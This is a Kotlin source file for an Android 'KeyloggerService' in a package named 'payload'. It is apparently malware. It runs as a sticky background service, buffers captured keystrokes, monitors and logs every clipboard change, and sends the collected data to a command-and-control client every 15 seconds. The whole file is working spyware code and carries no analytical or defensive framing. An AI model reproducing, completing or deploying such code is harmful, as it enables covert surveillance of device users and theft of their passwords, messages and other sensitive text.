package com.anonymousbeta.payload

import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class KeyloggerService : Service() {

    private val executor = Executors.newSingleThreadScheduledExecutor()
    private val buffer = StringBuilder()
    private var lastClipboard = ""

    override fun onCreate() {
        super.onCreate()
        startClipboardMonitor()
        executor.scheduleAtFixedRate({
            flushBuffer()
        }, 15, 15, TimeUnit.SECONDS)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    fun onKeystroke(text: String) {
        synchronized(buffer) {
            buffer.append(text)
        }
    }

    private fun startClipboardMonitor() {
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        cm.addPrimaryClipChangedListener {
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).coerceToText(this).toString()
                if (text.isNotEmpty() && text != lastClipboard) {
                    lastClipboard = text
                    synchronized(buffer) {
                        buffer.append("\n[CLIP] ").append(text).append("\n")
                    }
                }
            }
        }
    }

    private fun flushBuffer() {
        val data: String
        synchronized(buffer) {
            if (buffer.isEmpty()) return
            data = buffer.toString()
            buffer.clear()
        }
        C2Client.sendKeylog(data)
    }

    override fun onDestroy() {
        executor.shutdownNow()
        super.onDestroy()
    }
}
